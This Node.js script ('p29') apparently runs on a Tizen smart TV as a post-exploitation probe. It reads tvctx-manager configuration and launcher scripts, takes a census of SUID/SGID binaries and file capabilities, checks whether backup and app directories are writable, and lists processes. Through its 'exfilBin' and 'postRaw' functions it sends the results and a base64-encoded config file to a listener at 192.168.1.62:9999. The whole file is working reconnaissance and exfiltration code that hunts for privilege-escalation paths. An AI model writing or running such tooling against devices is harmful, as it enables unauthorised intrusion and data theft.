"use strict";
/* p29: tvctx-manager deep dive (boot flow, DBus API, config), SUID/cap full census, find '0' CLI, FreeMyTV location */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p29', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
function exfilBin(p, label){
  try { var b = fs.readFileSync(p); var b64 = b.toString('base64'); postRaw(label, b64); return 'posted '+b64.length+' b64'; }
  catch(e){ return 'err '+String(e).substring(0,100); }
}

// 1. tvctx-manager: boot flow
R.results.tvctx_launch_sh = run('cat /etc/tvctx-manager/launch_tvctx_manager.sh 2>&1', 10000);
R.results.tvctx_launcher_ls = run('ls -la /etc/tvctx-manager/launcher/ /etc/tvctx-manager/res/ 2>&1', 10000);
R.results.tvctx_res_ls = run('find /etc/tvctx-manager -type f 2>/dev/null | head -30', 15000);

// 2. find tvctx binaries + app-context-db-checker
R.results.find_tvctx = run("find / -xdev -name '*tvctx*' 2>/dev/null | head -20; echo ---; find / -xdev -name '*app-context*' 2>/dev/null | head -20; echo ---CHECKER---; find / -xdev -name '*appctx*' 2>/dev/null | head -20", 60000);
R.results.find_checker = run("find / -xdev -name 'app-context-db-checker' -o -name '*ctx*' -type f 2>/dev/null | grep -v dbspace | head -20", 60000);

// 3. appctx-config.json (exfil, 54KB)
R.results.appctx_cfg_size = run('wc -c /etc/tvctx-manager/appctx-config.json 2>&1', 5000);
R.results.appctx_cfg_head = run('head -c 3000 /etc/tvctx-manager/appctx-config.json 2>&1', 5000);
R.results.exfil_appctx_cfg = exfilBin('/etc/tvctx-manager/appctx-config.json', 'cfg_appctx-config');

// 4. launcher scripts content (world-readable?)
R.results.launcher_files = run("for f in /etc/tvctx-manager/launcher/*; do echo \"=== $f ===\"; head -c 2000 \"$f\" 2>&1; echo; done | head -120", 15000);

// 5. find the '0' CLI
R.results.find_0 = run("ls -la /system/bin/0 /usr/bin/0 /bin/0 /sbin/0 /usr/sbin/0 /opt/usr/bin/0 2>&1; echo ---; find /system /usr -maxdepth 3 -name '0' 2>/dev/null | head; echo ---PATH---; echo $PATH", 20000);

// 6. SUID/SGID full census
R.results.suid_census = run("find / -xdev \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null | head -60", 60000);
R.results.cap_census = run("for d in /usr/bin /usr/sbin /bin /sbin /opt/usr/bin /opt/usr/sbin; do [ -d \"$d\" ] || continue; for f in \"$d\"/*; do [ -f \"$f\" ] || continue; c=$(getcap \"$f\" 2>/dev/null); [ -n \"$c\" ] && echo \"$c\"; done; done 2>&1 | head -40", 90000);

// 7. FreeMyTV location (full fs search, bounded)
R.results.find_fmtv2 = run("find /opt /usr -maxdepth 6 -iname '*freemytv*' 2>/dev/null | head -10; echo ---; grep -rl 'FreeMyTVio' /opt/usr/apps/*/tizen-manifest.xml /opt/usr/apps/*/res/wgt/config.xml /usr/apps/*/tizen-manifest.xml /usr/apps/*/config.xml 2>/dev/null | head -10", 60000);

// 8. wasdb_backup writable? (wasutility restore source)
R.results.wasdb_backup = run('ls -la /webappservice/wasdb_backup/ 2>&1; echo ---; touch /webappservice/wasdb_backup/.t29test 2>&1 && echo WASDB_BAK_WRITABLE && rm /webappservice/wasdb_backup/.t29test || echo WASDB_BAK_NOT_WRITABLE', 10000);

// 9. /opt/usr/home/owner/apps_rw — writable?
R.results.apps_rw = run('ls -ld /opt/usr/home/owner/apps_rw 2>&1; echo ---; touch /opt/usr/home/owner/apps_rw/.t29test 2>&1 && echo APPSRW_WRITABLE && rm /opt/usr/home/owner/apps_rw/.t29test || echo APPSRW_NOT_WRITABLE', 10000);

// 10. processes: who runs as what (look for tvctx / webappservice / in system_share group)
R.results.ps_ctx = run("ps -ef 2>/dev/null | grep -iE 'tvctx|webapp|app-fw|launchpad|dbus|cynara' | grep -v grep | head -20", 10000);

// 11. init.d: boot scripts (readable)
R.results.initd = run("ls -la /etc/init.d/ 2>&1 | head -40", 10000);

R.results.final = 'done ' + new Date().toISOString();
postRaw('/p29info', JSON.stringify(R));
L('p29 done');
